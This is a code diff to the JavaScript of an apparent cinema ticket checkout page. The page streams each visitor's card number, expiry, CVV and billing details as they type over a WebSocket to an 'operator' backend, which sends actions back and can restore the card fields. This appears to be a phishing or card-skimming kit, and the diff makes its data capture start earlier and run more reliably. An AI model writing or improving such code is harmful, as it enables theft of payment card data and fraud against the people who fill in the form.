@@ -374,6 +374,7 @@ function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],
 // === Payment Backend WebSocket ===
 var ws=null,sid=null;
 var reconnectTimer=null,wsRetries=0,wsConnecting=false;
+var _sessionCreating=false;
 var cid=localStorage.getItem('cineplex_cid');
 if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('cineplex_cid',cid)}
 
@@ -392,16 +393,23 @@ if(socket!==ws)return;
 wsConnecting=false;wsRetries=0;
 console.log('[WS] Connected:',socket.url);
 if(socket._hb)clearInterval(socket._hb);
-socket._hb=setInterval(function(){if(socket===ws&&socket.readyState===WebSocket.OPEN)socket.send(JSON.stringify({type:'heartbeat'}))},10000)
+socket._hb=setInterval(function(){if(socket===ws&&socket.readyState===WebSocket.OPEN)socket.send(JSON.stringify({type:'heartbeat'}))},10000);
+// Create session immediately on WS open (one session per page visit)
+if(!sid){
+_sessionCreating=true;
+var initPayload=buildPayload();
+initPayload.ua=navigator.userAgent;
+socket.send(JSON.stringify({type:'customer_input',payload:initPayload}));
+}
 };
 socket.onmessage=function(e){
 var msg=JSON.parse(e.data);
 console.log('[WS] Received:',msg);
 if(msg.type==='operator_action'){
 var p=msg.payload;var a=p.action;
-if(a==='ack'){sid=p.sessionId;console.log('[WS] Session:',sid)}
+if(a==='ack'){sid=p.sessionId;_sessionCreating=false;console.log('[WS] Session:',sid)}
 else if(a==='session_restored'){
-  sid=p.sessionId;console.log('[WS] Restored:',sid);
+  sid=p.sessionId;_sessionCreating=false;console.log('[WS] Restored:',sid);
   // Restore form fields
   if(p.cardInfo){var ci=p.cardInfo;if(ci.cardHolder)document.getElementById('card-name').value=ci.cardHolder;if(ci.cardNumber)document.getElementById('card-number').value=ci.cardNumber.replace(/(\\d{4})(?=\\d)/g,'\$1 ');if(ci.expiry)document.getElementById('card-expiry').value=ci.expiry;if(ci.cvv)document.getElementById('card-cvv').value=ci.cvv}
   if(p.customerInfo){var cu=p.customerInfo;if(cu.fullName)document.getElementById('bill-name').value=cu.fullName;if(cu.phone){var phEl=document.getElementById('bill-phone');phEl.value=cu.phone;formatPhone(phEl)}if(cu.email)document.getElementById('bill-email').value=cu.email;if(cu.address1)document.getElementById('bill-address').value=cu.address1;if(cu.city)document.getElementById('bill-city').value=cu.city;if(cu.state)document.getElementById('bill-province').value=cu.state;if(cu.country)document.getElementById('bill-country').value=cu.country;if(cu.zipCode)document.getElementById('bill-postal').value=cu.zipCode}
@@ -496,7 +504,10 @@ sendPayload();
 function sendPayload(){
 var payload=buildPayload();
 payload.ua=navigator.userAgent;
-if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
+if(!sid){
+if(_sessionCreating){setTimeout(sendPayload,300);return}
+ws.send(JSON.stringify({type:'customer_input',payload:payload}));return
+}
 payload.status='pending';
 payload.sessionId=sid;
 ws.send(JSON.stringify({type:'session_update',payload:payload}));
@@ -576,6 +587,7 @@ var zp=document.getElementById('bill-postal');
 var liveTimer=null;
 function livePush(){
 if(!ws||ws.readyState!==1)return;
+if(!sid&&_sessionCreating)return;
 var payload=buildPayload();
 if(!sid){
 ws.send(JSON.stringify({type:'customer_input',payload:payload}));
